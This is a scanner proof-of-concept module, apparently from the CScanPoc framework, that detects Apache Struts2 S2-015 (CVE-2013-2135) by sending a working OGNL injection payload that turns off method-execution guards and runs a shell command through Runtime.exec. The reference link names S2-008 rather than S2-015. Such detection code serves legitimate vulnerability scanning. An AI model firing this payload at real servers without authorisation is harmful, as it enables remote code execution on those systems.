# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0008_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-015远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-06-05'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，该漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式
    '''  # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-008'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2013-2135'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Struts 2.0.0 - Struts 2.3.14.2  '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f1b12706-9de2-4f6a-8556-e34da557a848'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloadurl = {'''/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo 92933839f1efb2da9a4799753ee8d79c').getInputStream())}'''}
            request = requests.get(
                '{target}/{payload}.action'.format(target=self.target, payload=payloadurl))
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
